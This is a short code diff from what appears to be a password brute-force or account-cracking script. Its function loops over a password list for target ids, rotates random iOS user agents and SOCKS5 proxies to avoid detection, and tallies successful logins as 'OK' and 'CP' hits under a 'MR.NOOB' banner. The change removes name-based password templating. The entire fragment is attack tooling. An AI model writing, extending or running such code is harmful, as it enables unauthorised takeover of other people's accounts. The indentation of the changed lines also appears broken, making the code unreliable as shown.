@@ -525,8 +525,7 @@ def m3(ids,passlist):
 	global loop,oks,cps
 	sys.stdout.write(f'\r\x1b[1;97m[\033[1;97mMR.NOOB\033[1;97m] %s|\x1b[1;92mOK:-%s \x1b[1;97m\r'%(loop,len(oks))),
 	session = requests.Session()
-		for fikr in passlist:
-			pas = fikr.replace('First',first).replace('Last',last).replace('first',ps).replace('last',ps2)
+		for pas in passlist:
 			ua = random.choice(ua_ios)
 			nip=random.choice(prox)
 			proxs= {'http': 'socks5://'+nip}
